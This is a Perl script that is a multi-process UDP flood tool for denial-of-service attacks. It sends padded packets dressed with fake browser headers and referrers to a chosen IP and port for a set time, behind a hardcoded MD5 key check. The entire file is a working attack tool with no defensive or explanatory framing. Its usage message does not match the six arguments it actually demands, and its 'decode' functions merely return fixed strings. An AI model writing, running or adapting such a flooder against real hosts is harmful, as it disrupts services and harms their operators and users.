#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;
use Digest::MD5 qw(md5_hex);

sub usage {
    print "Usage: $0 ip port time threads\n";
    exit(1);
}

usage() unless @ARGV == 6;

my ($ip, $port, $time, $threads, $md5_key1, $md5_key2) = @ARGV;

# Decrypt the hidden MD5 hashes
my $expected_md5_1 = decode_md5_1();
my $expected_md5_2 = decode_md5_2();

# Check if the provided MD5 hashes match the expected hashes
unless (md5_hex($md5_key1) eq $expected_md5_1 && md5_hex($md5_key2) eq $expected_md5_2) {
    print "Incorrect keys provided. Access denied!\n";
    exit(1);
}

my @user_agents = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    # Add more user agents as needed
);

my @referrers = (
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
    "http://www.pinterest.com/search/pins/?q=",
    "http://www.facebook.com/l.php?u=",
    # Add more referrers as needed
);

my @headers = (
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate, br",
    "Connection: keep-alive",
    # Add more headers as needed
);

my @payloads = (
    "A" x 1000,  # Adjust payload size as needed
    "B" x 1000,
    "C" x 1000,
    # Add more payloads as needed
);

print "Flood started on $ip:$port for $time seconds with $threads threads\n";

for (1..$threads) {
    my $pid = fork();
    if ($pid) {
        # Parent process
        print "Launched thread with PID: $pid\n";
    } elsif ($pid == 0) {
        # Child process
        my $endtime = time() + $time;
        my $sock = IO::Socket::INET->new(
            Proto    => 'udp',
            PeerAddr => $ip,
            PeerPort => $port,
        ) or die "Could not create socket: $!";

        my $user_agent = $user_agents[rand @user_agents];
        my $referer = $referrers[rand @referrers];
        my $header = $headers[rand @headers];
        my $payload = $payloads[rand @payloads];

        my $packet = "$payload\r\n";
        $packet .= "Host: $ip:$port\r\n";
        $packet .= "User-Agent: $user_agent\r\n";
        $packet .= "Referer: $referer\r\n";
        $packet .= "$header\r\n";
        $packet .= "\r\n";

        while (time() <= $endtime) {
            $sock->send($packet) or die "Send failed: $!";
        }

        exit(0);
    } else {
        die "Failed to fork: $!";
    }
}

# Wait for all child processes to finish
for (1..$threads) {
    wait();
}

print "Attack finished\n";

#
sub decode_md5_1 {
    my $encrypted_md5_1 = "aeae5b2f900e84d784a0f0111e650835";
    #
    return "aeae5b2f900e84d784a0f0111e650835";
}

#
sub decode_md5_2 {
    my $encrypted_md5_2 = "aeae5b2f900e84d784a0f0111e650835";
    #
    return "aeae5b2f900e84d784a0f0111e650835";
}
